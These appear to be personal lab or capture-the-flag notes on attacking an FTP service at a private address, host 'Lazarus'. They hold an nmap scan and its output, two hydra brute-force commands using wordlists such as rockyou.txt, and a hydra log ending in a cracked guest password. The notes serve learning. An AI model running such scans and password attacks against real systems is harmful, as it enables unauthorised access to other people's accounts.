# Alpha notes

- searching for ftp services:

```bash
 nmap -PS 10.128.161.1-22 | grep "ftp" -B 5 -A 5
```

- Lazarus host - 10.128.161.57
- Hydra - password cracking tool

Nmap scan report for 10.128.161.57
Host is up (0.0050s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
80/tcp   open  http    nginx 1.14.2
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
Service Info: Host: Lazarus

hydra -t 1 -l admin -P ./alpha/rockyou.txt -vV 10.128.161.57 ftp 
hydra -L logins.txt -P -f -v 100000passwds.txt -t 32 10.128.161.57 ftp

[ATTEMPT] target 10.128.161.57 - login "guest" - pass "lucky1" - 539 of 3000 [child 24] (0/0)
[ATTEMPT] target 10.128.161.57 - login "guest" - pass "sporting" - 540 of 3000 [child 12] (0/0)
[21][ftp] host: 10.128.161.57   login: guest   password: qazwsx
[STATUS] attack finished for 10.128.161.57 (valid pair found)
1 of 1 target successfully completed, 1 valid password found